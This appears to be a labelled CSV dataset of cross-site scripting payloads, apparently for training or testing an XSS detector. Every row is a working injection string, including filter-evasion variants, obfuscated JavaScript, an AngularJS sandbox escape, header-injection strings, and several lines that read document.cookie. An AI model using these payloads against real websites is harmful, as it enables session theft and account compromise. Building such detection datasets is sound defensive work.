payload,xss
<iframe onpointerenter=alert(1) style=display:block>AnonKryptiQuz</iframe>,1
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable style=display:block>drop here</acronym>",1
"<input3 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",1
"<big oncut=""alert(1)"" contenteditable>AnonKryptiQuz</big>",1
<marquee onstart=alert(1)>,1
"<p draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</p>",1
"<svg draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</svg>",1
"<noframes onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noframes>",1
"<button onclick=""alert(1)"">AnonKryptiQuz</button>",1
"<Video> <source onerror = ""javascript: alert (AnonKryptiQuz)"">",1
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;,1
"<small draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</small>",1
"exp/*<AnonKryptiQuz STYLE='no\xss:noxss(""*//*"");",1
<time onbeforescriptexecute=alert(1)><script>1</script>,1
<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>,1
"<object onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</object>",1
<svg><tfoot onload=alert(1)></tfoot>,1
"<pre oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<thead draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",1
"<footer ondblclick=""alert(1)"">AnonKryptiQuz</footer>",1
"<style>@keyframes slidein {}</style><set style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></set>",1
<cite onpointermove=alert(1) style=display:block>AnonKryptiQuz</cite>,1
"<fieldset onmouseenter=""alert(1)"">AnonKryptiQuz</fieldset>",1
<summary onpointerleave=alert(1) style=display:block>AnonKryptiQuz</summary>,1
'});alert(document.cookie);//',1
"<rp onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",1
"<legend onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</legend>",1
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>,1
"<section onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</section>",1
"<bgsound onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",1
<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>,1
<svg><picture onload=alert(1)></picture>,1
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=print()></details>",1
"""""><img src=y onerror=confirm(1)>",1
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,1
<sub onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</sub><input value=clickme>,1
"<style>:target {color:red;}</style><figure id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></figure>",1
"<tr ondblclick=""alert(1)"">AnonKryptiQuz</tr>",1
"<template onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</template>",1
<nextid onpointerover=alert(1) style=display:block>AnonKryptiQuz</nextid>,1
"<style>:target {transform: rotate(180deg);}</style><q id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></q>",1
"<section oncontextmenu=""alert(1)"">AnonKryptiQuz</section>",1
"{{c='%27%27.sub.call;b='%27%27.sub.bind;a='%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(""astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?voide:(window.X=true,alert(document.domain)))+';astNode.argument={type:'Identifier',name:'foo'};"");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a='%27%27.sub;$eval('a(b.c)'):[].push.apply=a:}}",1
"<tfoot draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</tfoot>",1
"<audio onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",1
console.log(document.domain),1
"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></font>",1
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=print()></abbr>",1
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",1
"<script>throw onerror=alert,1</script>",1
"<template onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</template>",1
"<figcaption onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",1
<script itworksinallbrowsers>/*<script* */alert(1)</script ?,1
"<dfn draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",1
<header onpointerout=alert(1) style=display:block>AnonKryptiQuz</header>,1
<ul onpointerup=alert(1) style=display:block>AnonKryptiQuz</ul>,1
"<button onmousedown=""alert(1)"">AnonKryptiQuz</button>",1
‘>alert(154)</script><script/154=’;;;;;;;,1
"<li id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></li>",1
<data contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",1
<rt onpointerup=alert(1) style=display:block>AnonKryptiQuz</rt>,1
”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/>,1
<s%00c%00r%00i%00p%00t>alert(1)</script>,1
"<image2 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",1
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onanimationend=""alert(1)""></image3>",1
<link onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</link><input value=clickme>,1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
<rp onpointerleave=alert(1) style=display:block>AnonKryptiQuz</rp>,1
<svg><frameset onload=alert(1)></frameset>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe2 id=x style=""position:absolute;"" onanimationcancel=""print()""></iframe2>",1
"<tt draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",1
"<figcaption onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",1
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",1
<a onmouseover=alert(document.cookie)>xxs link</a>,1
<tr onafterscriptexecute=alert(1)><script>1</script>,1
"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,83,83))"">",1
"<!--xss""><img src=x onerror=prompt(document.domain)>-->",1
<body onselectionchange=alert(1)>select some text,1
<blink onmousewheel=alert(1) style=display:block>requires scrolling,1
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",1
"<strike onmousemove=""alert(1)"">AnonKryptiQuz</strike>",1
"<ins onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</ins>",1
<sup contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<address oncut=""alert(1)"" contenteditable>AnonKryptiQuz</address>",1
<img id=x tabindex=1 onfocus=alert(1)></img>,1
</tag><svg onload=alert(1)>,1
"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable style=display:block>drop here</param>",1
"<select onchange=""alert('AnonKryptiQuz')""><option>Option</option></select>",1
"<small onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</small>",1
<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>,1
"<th onmouseleave=""alert(1)"">AnonKryptiQuz</th>",1
"<big draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</big>",1
"<abbr onclick=""alert(1)"">AnonKryptiQuz</abbr>",1
"1""><%3Csvg onload=alert%28document.cookie%29>'",1
"<select onmouseup=""alert(1)"">AnonKryptiQuz</select>",1
"<li onmouseenter=""alert(1)"">AnonKryptiQuz</li>",1
"<;EMBED SRC="";http://ha.ckers.org/xss.swf""; AllowScriptAccess="";always"";>;<;/EMBED>;",1
"<style>:target {color:red;}</style><q id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></q>",1
"<acronym onclick=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",1
"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",1
<strong onpointerleave=alert(1) style=display:block>AnonKryptiQuz</strong>,1
"<blink onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",1
\&quot;;alert(&apos;XSS&apos;);//,1
"<s onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</s>",1
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></form>",1
"<bdo draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",1
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></option>",1
"param A=<script>alert(""",1
"<u oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
<frame onpointerenter=alert(1) style=display:block>AnonKryptiQuz</frame>,1
<html ontouchend=alert(1)>,1
<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>,1
"<rt onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rt>",1
<scr<script>ipt>alert('AnonKryptiQuz')</scr</script>ipt>,1
';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,1
"""javascript:confirm(0);"",",1
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionstart=alert(1)></dfn>",1
"<option draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</option>",1
<x%0Aonxxx=1,1
<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""print()""></slot>",1
"<noembed onclick=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",1
"<dfn draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</dfn>",1
<spacer contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<span draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</span>",1
<em onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</em><input value=clickme>,1
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>,1
"<style>@keyframes slidein {}</style><picture style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></picture>",1
"<command onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</command>",1
<acronym onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</acronym><input value=clickme>,1
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionstart=alert(1)></td>",1
//*><ScRipt>alert(/AnonKryptiQuz/)</ScriPT>,1
<button popovertarget=x>Click me</button><dfn ontoggle=alert(1) popover id=x>AnonKryptiQuz</dfn>,1
<aside onbeforescriptexecute=alert(1)><script>1</script>,1
<small onpointerup=alert(1) style=display:block>AnonKryptiQuz</small>,1
"<tt onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",1
<rb onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</rb><input value=clickme>,1
"<rtc draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</rtc>",1
<menu onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</menu>,1
"<label onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</label>",1
"<iframe onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</iframe>",1
"<small onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</small>",1
<xmp onpointerup=alert(1) style=display:block>AnonKryptiQuz</xmp>,1
"<custom tags oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<time draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</time>",1
"<svg onmouseout=""alert(1)"">AnonKryptiQuz</svg>",1
"<div draggable=""true"" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable style=display:block>drop here</shadow>",1
"<style>:target {color:red;}</style><font id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></font>",1
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable style=display:block>drop here</keygen>",1
<x contenteditable onblur=alert(1)>lose focus!,1
<!--><svg onload=alert(1)-->.php,1
Reflect.set.call`${location}${'href'}${name}`,1
"<rb ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</rb>",1
"<html onmouseenter=""alert(1)"">AnonKryptiQuz</html>",1
<svg/onload='alert&#40 23 &#41'>,1
"""<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(“AnonKryptiQuz”)>""",1
"<output onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</output>",1
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
"<cite onclick=""alert(1)"">AnonKryptiQuz</cite>",1
<svg><basefont onload=alert(1)></basefont>,1
'); alert('xss'); var x=',1
"<rp onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rp>",1
"<source onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</source>",1
"""<IMG DYNSRC=\""javascript:alert('AnonKryptiQuz');\"">""",1
<li onpointerdown=alert(1) style=display:block>AnonKryptiQuz</li>,1
<colgroup onbeforescriptexecute=alert(1)><script>1</script>,1
"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable style=display:block>drop here</ul>",1
<hgroup onafterscriptexecute=alert(1)><script>1</script>,1
"<isindex draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</isindex>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ol>",1
"<wbr onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</wbr>",1
<button popovertarget=x>Click me</button><shadow onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</shadow>,1
<;/script>;<;script>;alert(1)<;/script>;,1
"<dl onclick=""alert(1)"">AnonKryptiQuz</dl>",1
#<iframe/onload=alert(0);>,1
<bdo onpointerdown=alert(1) style=display:block>AnonKryptiQuz</bdo>,1
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>",1
"<element draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</element>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></template>",1
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onanimationend=""alert(1)""></custom tags>",1
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",1
"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rb>",1
"%00""><img src=x onerror=alert`AnonKryptiQuz`//",1
"<script ,>alert()</script>",1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
"<animatemotion onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatemotion>",1
"<area onmouseover=""alert(1)"">AnonKryptiQuz</area>",1
"<custom tags onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",1
"<img src=""javascript:alert('AnonKryptiQuz');"">",1
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionstart=alert(1)></audio>",1
"<pre onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",1
"<bdi onmouseover=""alert(1)"">AnonKryptiQuz</bdi>",1
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};AnonKryptiQuz=new+MouseEvent();AnonKryptiQuz.isTrusted=true;AnonKryptiQuz.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(AnonKryptiQuz);</SCRIPT>#,1
"<col id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></col>",1
"<;A HREF="";//www.google.com/"";>;XSS<;/A>;",1
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(1)""></sub>",1
""" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//",1
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<plaintext onmouseout=""alert(1)"">AnonKryptiQuz</plaintext>",1
"<content onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</content>",1
"<html draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</html>",1
<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>,1
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>,1
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,1
"<svg ondblclick=""alert(1)"">AnonKryptiQuz</svg>",1
"<dir oncut=""alert(1)"" contenteditable>AnonKryptiQuz</dir>",1
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onwebkitanimationend=""alert(1)""></tbody>",1
"<marquee onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",1
%E5%98%8D%E5%98%8ASet-Cookie%3A%20whoami%3Dthecyberneh%25u2028%25u2029AnonKryptiQuz-Payload%3A%2520%3Cscript%3Ealert%281%29%3C%2Fscript%3E,1
"<i onmouseover=""alert(1)"">AnonKryptiQuz</i>",1
"<article oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</article>",1
"<caption onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",1
"\u0065\u0076\u0061\u006C('ablolzers'['replace'](""b"",""l"")['replace'](""lolzers"",""ert""))`AnonKryptiQuz`",1
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>",1
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E,1
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable style=display:block>drop here</bdo>",1
"<pre onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",1
"<ul id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></ul>",1
"<frameset oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",1
"<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>",1
"<q draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</q>",1
"<input type=""submit"">",1
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable style=display:block>drop here</link>",1
"<img LOWSRC=""javascript:document.vulnerable=true;"">",1
%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E,1
